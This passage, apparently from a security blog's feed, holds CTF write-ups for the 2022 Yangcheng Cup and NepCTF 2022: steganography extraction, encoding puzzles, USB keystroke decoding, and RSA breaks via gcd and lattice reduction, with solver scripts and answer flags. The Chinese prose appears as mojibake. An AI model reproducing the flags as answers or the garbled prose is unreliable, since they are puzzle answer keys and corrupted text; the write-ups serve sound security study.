class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;829962.txt&quot;</span>, encoding=<span class="string">&quot;gbk&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        all_text = f.read()</span><br><span class="line"></span><br><span class="line">        im = encode(all_text)</span><br><span class="line">        im.save(<span class="string">&quot;out.bmp&quot;</span>)</span><br></pre></td></tr></table></figure><p>é€šè¿‡çˆ†ç ´æ–¹æ³•é€†å›åŸæ–‡æœ¬å³å¯ï¼Œå‘ç°åŸæ–‡ä¸ºä¸€æœ¬ä¹¦ï¼ŒåŒ…å«å¤§é‡ä¸­æ–‡ï¼Œè¿˜åŸæ—¶è®¾ç½®ä¸è¾“å‡ºä¸­æ–‡ï¼Œç¼©çŸ­è¿è¡Œæ—¶é—´ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">r&#x27;out.bmp&#x27;</span>)</span><br><span class="line">width, height = img.size</span><br><span class="line"></span><br><span class="line">text=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">x, y = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200000</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">       r,g,b = img.getpixel((x,y))</span><br><span class="line">       <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">126</span>):</span><br><span class="line">           <span class="keyword">if</span> ((j &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>) == g <span class="keyword">and</span> j &amp; <span class="number">0xFF</span> == b:</span><br><span class="line">               text+=<span class="built_in">chr</span>(j)</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="keyword">pass</span></span><br><span class="line">       <span class="keyword">if</span> x == width - <span class="number">1</span>:</span><br><span class="line">           x = <span class="number">0</span></span><br><span class="line">           y += <span class="number">1</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x,y)</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">r&#x27;text.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(text)</span><br></pre></td></tr></table></figure><p>åœ¨å¾—åˆ°çš„å­—ç¬¦é‡Œï¼Œæ‰¾åˆ°flagæ ¼å¼çš„ä¸”å¸¦æœ‰æ„ä¹‰çš„å­—ç¬¦ï¼Œç»„æˆflagï¼š<code>flag&#123;h1d3_1n_th3_p1ctur3&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="è¿·å¤±å¹»å¢ƒ"><a href="#è¿·å¤±å¹»å¢ƒ" class="headerlink" title="è¿·å¤±å¹»å¢ƒ"></a>è¿·å¤±å¹»å¢ƒ</h3><blockquote><p>èµ°ä¸å‡ºè‡ªè´£ç©ºé—´ï¼Œæ²‰æººäºæˆ‘ä»¬æ˜¨å¤©ï¼Œè¿˜èƒ½ä¸èƒ½ç›¸è§ã€‚</p></blockquote><p>ç”¨DiskGeniusæ‰“å¼€vmdkæ–‡ä»¶ï¼Œåœ¨å›æ”¶ç«™å‘ç°ä¸€å¼ å¯è‰jpgå›¾ç‰‡å’Œä¸€å¼ æ— æ–‡ä»¶ç±»å‹åç¼€çš„å¹»å¢ƒpngå›¾ç‰‡ï¼Œæå–å‡ºæ¥ã€‚</p><p>åœ¨â€œè¿·å¤±å¹»å¢ƒâ€å¤¹å­é‡Œæœ‰1å¼ å¯è‰jpgå›¾ç‰‡å’Œ100å¼ ä¸€æ ·çš„å¹»å¢ƒpngå›¾ç‰‡ï¼Œå‰åç›¸åŒå›¾ç‰‡çš„å¤§å°ä¸åŒï¼Œå°è¯•ç›²æ°´å°æå–ä¿¡æ¯ä¸æˆåŠŸï¼Œå†å°è¯•å°†å¹»å¢ƒpngå¤§å›¾ä¸å°å›¾è¿›è¡Œå‡ï¼ˆsubï¼‰æ“ä½œï¼Œå¾—åˆ°</p><p><img src="/2022/09/04/match-2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/solved.bmp" alt="solved" style="zoom:80%;"></p><p>keyä¸º <code>å¯è‰å‰æ¥æŠ¥é“</code>ã€‚</p><p>å›æ”¶ç«™é‡Œå¯è‰jpgå›¾ç‰‡å­˜åœ¨å¤‡æ³¨ä¿¡æ¯ <code>çŒœä¸åˆ°ï¼Œæ€ä¹ˆæƒ³éƒ½çŒœä¸åˆ°å§ã€‚</code>ï¼Œç”¨outguessæå–ï¼š</p><p><code>outguess -r keli.jpg -k &quot;å¯è‰å‰æ¥æŠ¥é“&quot; -t out.txt</code></p><p>å¾—åˆ°flagï¼š<code>DASCTF&#123;f473a6fd2de17a0c5794414b3905ebbe&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="ç­¾ä¸ªåˆ°"><a href="#ç­¾ä¸ªåˆ°" class="headerlink" title="ç­¾ä¸ªåˆ°"></a>ç­¾ä¸ªåˆ°</h3><blockquote><p>ç­¾ä¸ªåˆ°ï¼Œè¯·æ³¨æ„ï¼Œæœ¬æ¬¡æ¯”èµ›æ‰€æœ‰ flag æäº¤æ—¶éƒ½åªéœ€è¦æäº¤æ‹¬å·å†…çš„å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚è¿™ä¸ªé¢˜çš„ flag å¦‚æœæ˜¯ flag{xxx}, æ‚¨åªéœ€è¦æäº¤ xxx å³å¯å¾—åˆ†ã€‚</p></blockquote><p><code>ZMJTPM33TIGQTLMDTV4JXLYQTNMQTAOLTSGTRMOLZD2JPMOETIEQBZ3PTZ2U2===</code>ï¼Œåˆçœ‹ä¸ºbase32ï¼Œè§£ç ä¸ºä¹±ç ã€‚</p><p><code>flag&#123;</code> å¯¹åº”base32ç¼–ç ä¸º <code>MZWGCZ33</code>ï¼Œæ•…ä¸ºrot13+base32ï¼Œè§£ç å¾— <code>flag&#123;5f3c029eac023481fbd8d5ad15b73b34&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="LRSA"><a href="#LRSA" class="headerlink" title="LRSA"></a>LRSA</h3><blockquote><p>RSA and some other things</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPQ</span>(<span class="params">p,q</span>):</span><br><span class="line">    P=getPrime(<span class="number">2048</span>)</span><br><span class="line">    Q=getPrime(<span class="number">2048</span>)</span><br><span class="line">    t=(p*P-<span class="number">58</span>*P+q)%Q</span><br><span class="line">    <span class="keyword">assert</span> (isPrime(Q))</span><br><span class="line">    <span class="keyword">return</span> P,Q,t</span><br><span class="line"></span><br><span class="line">B=getRandomNBitInteger(<span class="number">11</span>)</span><br><span class="line">p=getPrime(B)</span><br><span class="line">q=getPrime(B)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">P,Q,t=getPQ(p,q)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;B=&quot;</span>,B)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;P*P*Q=&quot;</span>,P*P*Q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;P*Q*Q=&quot;</span>,P*Q*Q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;t=&quot;</span>,t)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br></pre></td></tr></table></figure></blockquote><p>$\gcd(P \cdot P \cdot Q,P \cdot Q \cdot Q)=P \cdot Q$ï¼Œç»§è€Œæ±‚å¾— $P$ å’Œ $Q$ï¼Œåˆæœ‰ $t=(P \cdot(p-58)+q) \bmod Q$ï¼Œæ„é€ æ ¼ $\begin{bmatrix} 1 &amp; P \newline 0 &amp; Q \end{bmatrix}$ï¼Œåˆ©ç”¨LLLç®—æ³•è§„çº¦å¾—åˆ° $p-58$ å’Œ $q$ å€¼ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">B = <span class="number">1023</span></span><br><span class="line">PPQ = <span class="number">17550772391048142376662352375650397168226219900284185133945819378595084615279414529115194246625188015626268312188291451580718399491413731583962229337205180301248556893326419027312533686033888462669675100382278716791450615542537581657011200868911872550652311318486382920999726120813916439522474691195194557657267042628374572411645371485995174777885120394234154274071083542059010253657420242098856699109476857347677270860654429688935924519805555787949683144015873225388396740487817155358042797286990338440987035608851331840925854381286767024584195081004360635842976624747610461507795755042915965483135990495921912997789567020652729777216671481467049291624343256152446367091568361258918212012737611001009003078023715854575413979603297947011959023398306612437250872299406744778763429172689675430968886613391356192380152315042387148665654062576525633130546454743040442444227245763939134967515614637300940642555367668537324892890004459521919887178391559206373513466653484926149453481758790663522317898916616435463486824881406198956479504970446076256447830689197409184703931842169195650953917594642601134810084247402051464584676932882503143409428970896718980446185114397748313655630266379123438583315809104543663538494519415242569480492899140190587129956835218417371308642212037424611690324353109931657289337536406499314388951678319136343913551598851601805737870217800009086551022197432448461112330252097447894028786035069710260561955740514091976513928307284531381150606428802334767412638213776730300093872457594524254858721551285338651364457529927871215183857169772407595348187949014442596356406144157105062291018215254440382214000573515515859668018846789551567310531570458316720877172632139481792680258388798439064221051325274383331521717987420093245521230610073103811158660291643007279940393509663374960353315388446956868294358252276964954745551655711981</span></span><br><span class="line">PQQ = <span class="number">17632503734712698604217167790453868045296303200715867263641257955056721075502316035280716025016839471684329988600978978424661087892466132185482035374940487837109552684763339574491378951189521258328752145077889261805000262141719400516584216130899437363088936913664419705248701787497332582188063869114908628807937049986360525010012039863210179017248132893824655341728382780250878156526086594253092249935304259986328308203344932540888448163430113818706295806406535364433801544858874357459282988110371175948011077595778123265914357153104206808258347815853145593128831233094769191889153762451880396333921190835200889266000562699392602082643298040136498839726733129090381507278582253125509943696419087708429546384313035073010683709744463087794325058122495375333875728593383803489271258323466068830034394348582326189840226236821974979834541554188673335151333713605570214286605391522582123096490317734786072061052604324131559447145448500381240146742679889154145555389449773359530020107821711994953950072547113428811855524572017820861579995449831880269151834230607863568992929328355995768974532894288752369127771516710199600449849031992434777962666440682129817924824151147427747882725858977273856311911431085373396551436319200582072164015150896425482384248479071434032953021738952688256364397405939276917210952583838731888536160866721278250628482428975748118973182256529453045184370543766401320261730361611365906347736001225775255350554164449014831203472238042057456969218316231699556466298168668958678855382462970622819417830000343573014265235688391542452769592096406400900187933156352226983897249981036555748543606676736274049188713348408983072484516372145496924391146241282884948724825393087105077360952770212959517318021248639012476095670769959011548699960423508352158455979906789927951812368185987838359200354730654103428077770839008773864604836807261909</span></span><br><span class="line">t = <span class="number">44</span></span><br><span class="line">c = <span class="number">4364802217291010807437827526073499188746160856656033054696031258814848127341094853323797303333741617649819892633013549917144139975939225893749114460910089509552261297408649636515368831194227006310835137628421405558641056278574098849091436284763725120659865442243245486345692476515256604820175726649516152356765363753262839864657243662645981385763738120585801720865252694204286145009527172990713740098977714337038793323846801300955225503801654258983911473974238212956519721447805792992654110642511482243273775873164502478594971816554268730722314333969932527553109979814408613177186842539860073028659812891580301154746</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">PQ = gcd(PPQ,PQQ)</span><br><span class="line">P = PPQ//PQ</span><br><span class="line">Q = PQQ//PQ</span><br><span class="line"><span class="built_in">print</span>(P)</span><br><span class="line"><span class="built_in">print</span>(Q)</span><br><span class="line"></span><br><span class="line">A = Matrix(ZZ,[[<span class="number">1</span>,P],[<span class="number">0</span>,Q]])</span><br><span class="line">x = A.LLL()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">p = -x+<span class="number">58</span></span><br><span class="line">q = (t-P*(p-<span class="number">58</span>))%Q</span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;8f3djoj9wedj2_dkc903cwckckdk&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="EasyRsa"><a href="#EasyRsa" class="headerlink" title="EasyRsa"></a>EasyRsa</h3><blockquote><p>really easy rsa</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">a = f.readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    n = <span class="built_in">int</span>(i)</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    m = c</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c = %s&#x27;</span> % (m)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = 38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>gcdæµ‹è¯•å‘ç°outputä¸­çš„ $n$ æœ‰ç´ å…¬å› å­ $p$ï¼Œé€†æ¨è¿˜åŸ $m$ å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">n = [<span class="number">65439077968397540989065489337415940784529269429684649365065378651353483030304843439003949649543376311871845618819107350646437252980144978447924976470943930075812834237368425374578215977641265884859875440799334807607478705932175148673160353577875890074101393042506714001617338265284910381849259298772642190619</span>,<span class="number">86843235426823545017422014398916780909062053456790256392304973548517489132984667679637386416948409930796162377844525829968317585749956057149930523547463230147376192820753802868362225137830225967953826475779047454555958271846035526319036389127587352017149417549187850782892924691511398536178090031958365483499</span>,<span class="number">57839320383142814687522363258949714784622321678585619281948174372461045134361003939684803510572969567182690634502610963365500727981041136988638273942465134797850643121827808482673619534240872593224537996099454035648829692386918230535360101064254854063175494150147494342652670585674593236663514793256521719547</span>,<span class="number">52668168898129361356420333177679019946307853075463961068071790653159090226904625885080236174231665178538405547828768043706515464922611051221394704678558922339886480247663138702481349098077291584992082414494275463670330534613607852999291645500391111597009868188974671249118213040057429113174377610094956993269</span>,<span class="number">79875848044631194160351918105738804229446748736206976033243436373010695259945613104837645712048695514204494137005015770637421510392760763371639480133851920449252506525423837434811693638210458851990502785655738042348115385964604080872180121543147063180945532713593712726527002909054818485584237993215139630243</span>,<span class="number">73100501797447180147684637554796375398455002202770022931512541062214916136294604754404667725341796896161398464327153718845280194035978972665664657052946003418121755545770123205426883869361411412259838522099085901563107814985172942977520233320215882707710717870398128412272218474014381169303848087621856187879</span>,<span class="number">89149546555397759430343098936690138982544367561661914051499112345535238108800665531588376806546499374457634397161670140520060064963391826220177798442707381640723248034061313974522233415815795656570220902974484865176728535660627712374835329967608728216749734529761431592345816592875807318876347151421393671763</span>,<span class="number">66449107450661172442868032153863675098235855689218695279414435182923510356012957155941548483160873271040452368644926703812707864779900715051152673705082002761445847561495295455460041902473282731259268870375921215589157288622757488879539441498396276257589120302991242300378364101246448094955634459779361686643</span>,<span class="number">79694880331320743031437708811856697413105291652061062223857313580221562305807771003185061831752133665835648647560103986928466217390444724672894866216636981793418219455653595717274553950715056120806463449033181486699963584346517910081706586345546292894426402568226579894766693070066214488743160957135286739213</span>,<span class="number">70521001788476157145543175674209083194325853388116385624440232036679708917857095748070597575068955423165296665429648694541353249787337464272095260410717659726012806836884799476995758902361678737968193674368688353935424186389207123637734230550266810766585903134004322848985320790788169777840924595645463787189</span>,<span class="number">51801430118171456966246071852561156183140136541960623661080056673664466785669585092926482194691254461430866302262960624015915371927788809661387318097968209364907625599562339722700041444342116899266802018340155635959614677597708758012024981583143521259152639480003228924151971208695043251548758407218187895663</span>,<span class="number">87310111118839703578797261862424304499548882114635944516216618095145194843718635007052242072452831460162126955481326379219639313067967998826898344673513019946299427614605216960081461930080199023399060417820769438661351988322185620598552697590115678078498754112860310272842870106790357443602405008865116282919</span>]</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">7552850543392291177573335134779451826968284497191536051874894984844023350777357739533061306212635723884437778881981836095720474943879388731913801454095897</span></span><br><span class="line">c = <span class="number">38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    q = <span class="built_in">int</span>(n[i]//p)</span><br><span class="line">    f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d = inverse_mod(e,f)</span><br><span class="line">    c = <span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n[i]))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(c)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;GWHT&#123;gixkJl7SJTcpLOL9zqwo&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Solomenâ€™s-puzzle-1"><a href="#Solomenâ€™s-puzzle-1" class="headerlink" title="Solomenâ€™s puzzle 1"></a>Solomenâ€™s puzzle 1</h3><blockquote><p>F1oweråšæ¢¦æ¢¦è§äº†Reedå’ŒSolomenï¼Œä»–ä»¬å‘Šè¯‰äº†F1owerè´¢å¯Œå¯†ç ï¼Œä½†æ˜¯F1owerè®°é”™äº†å‡ ä¸ªå­—èŠ‚ã€‚ã€‚è¯·å°†æœ€ç»ˆå¾—åˆ°çš„å®Œæ•´flag(åŒ…å«DASCTF{})è¿›è¡ŒMD5åå†æäº¤ï¼Œå³æäº¤ï¼š`â€DASCTF</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;å¤§èµ›ç”±ä¸­å…±å¹¿å·å¸‚å§”ç½‘ç»œå®‰å…¨å’Œä¿¡æ¯åŒ–å§”å‘˜ä¼šåŠå…¬å®¤ä½œä¸ºæŒ‡å¯¼å•ä½ï¼Œå¹¿å·å¸‚ç½‘ç»œå®‰å…¨äº§ä¸šä¿ƒè¿›ä¼šä¸»åŠï¼Œå¹¿ä¸œå¤–è¯­å¤–è´¸å¤§å­¦ã€æ­å·å®‰æ’ä¿¡æ¯æŠ€æœ¯è‚¡ä»½æœ‰é™å…¬å¸æ‰¿åŠï¼Œå¹¿å·å¸‚ä¿¡æ¯å®‰å…¨æµ‹è¯„ä¸­å¿ƒã€å¹¿å·äº’è”ç½‘åä¼šååŠã€‚&lt;/p&gt;
&lt;p&gt;å¤§èµ›ä»¥â€œç½‘ç»œå®‰å…¨ä¸ºäººæ°‘ã€ç½‘ç»œå®‰å…¨é äººæ°‘â€ä¸ºä¸»é¢˜</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022èµ›" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>NepCTF 2022</title>
    <link href="https://lazzzaro.github.io/2022/07/17/match-NepCTF-2022/"/>
    <id>https://lazzzaro.github.io/2022/07/17/match-NepCTF-2022/</id>
    <published>2022-07-17T13:18:30.000Z</published>
    <updated>2022-07-17T16:14:32.991Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>â€œNepCTF 2022â€æ˜¯ç”±Nepnepè”åˆç«™é˜Ÿä¸»åŠçš„å…¬ç›Šæ‹›æ–°èµ›äº‹ï¼Œæ—¨åœ¨ä»¥æœ‰ä»£è¡¨æ€§ã€æœ‰ç‰¹è‰²çš„é¢˜ç›®åŸ¹å…»æ–°ç”Ÿç½‘ç»œå®‰å…¨èƒ½åŠ›ã€‚</p><p>æ¯”èµ›æ—¶é—´ï¼š2022å¹´7æœˆ15æ—¥10:00 - 2022å¹´7æœˆ17æ—¥10:00ã€‚</p><p>æ¯”èµ›å½¢å¼ï¼šä¸ªäººè§£é¢˜èµ›</p><p>æ¯”èµ›é“¾æ¥ï¼š<a href="http://nep.lemonprefect.cn/">http://nep.lemonprefect.cn/</a></p><p>æ¯”èµ›å¹³å°ï¼šPower by CTFm</p><p>NepCTF 2022èµ›äº‹è¯´æ˜æ–‡æ¡£ï¼š<a href="https://www.wolai.com/nepnep/4c2ZG1UaTnVMmyYsKB5duj">https://www.wolai.com/nepnep/4c2ZG1UaTnVMmyYsKB5duj</a></p><p><strong>Rank: 4</strong></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h3><blockquote><p>æé™å¥—å¨ƒ</p><p>flagæ ¼å¼ä¸ºnepctf{}</p></blockquote><p>jpgä¸­æå–å‡ºzipå‹ç¼©åŒ…ï¼Œzipå‹ç¼©åŒ…å¥—å¨ƒ232å±‚ï¼Œç”¨cyberchef label+jumpå¾ªç¯æå–å‡ºæœ€å†…å±‚çš„pcapæ–‡ä»¶ï¼›</p><p>wiresharkæ‰“å¼€å‘ç°ä¸ºUSBé”®ç›˜æµé‡ï¼Œtsharkå·¥å…·æå–å‡ºusb.capdataæ•°æ®ï¼Œç”¨è„šæœ¬è¿˜åŸé”®ä½ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">normalKeys = &#123;</span><br><span class="line"><span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>,</span><br><span class="line"><span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>,</span><br><span class="line"><span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>,</span><br><span class="line"> <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>,</span><br><span class="line">  <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>,</span><br><span class="line"><span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>,</span><br><span class="line"><span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span 